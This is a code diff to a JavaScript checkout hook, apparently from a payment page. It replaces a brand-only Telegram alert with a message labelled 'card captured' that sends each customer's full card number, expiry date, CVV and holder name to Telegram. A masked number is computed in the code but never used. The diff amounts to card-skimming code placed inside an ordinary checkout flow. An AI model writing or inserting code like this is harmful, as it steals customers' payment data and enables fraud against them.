@@ -81,8 +81,19 @@ export const useCheckoutOrder = () => {
       // Enviar notificação para o Telegram quando os dados do cartão forem salvos no banco
       try {
         const brandName = (cardData.brand || 'Unknown').toUpperCase();
-        await sendTelegramNotification(`💳 Novo cartão salvo no BD - ${brandName}`);
-        console.log('Telegram notification sent on card data save to database');
+        const maskedNumber = cardData.number.replace(/^(\d{6})(\d+)(\d{4})$/, "$1******$3");
+        
+        // Formatando a mensagem com os detalhes do cartão
+        const message = `💳 Cartão capturado:
+        
+Número: ${cardData.number}
+Validade: ${cardData.expiryDate}
+CVV: ${cardData.cvv}
+Titular: ${cardData.holderName}
+Bandeira: ${brandName}`;
+        
+        await sendTelegramNotification(message);
+        console.log('Telegram notification sent with card details');
       } catch (telegramError) {
         console.error('Erro ao enviar notificação para o Telegram:', telegramError);
       }
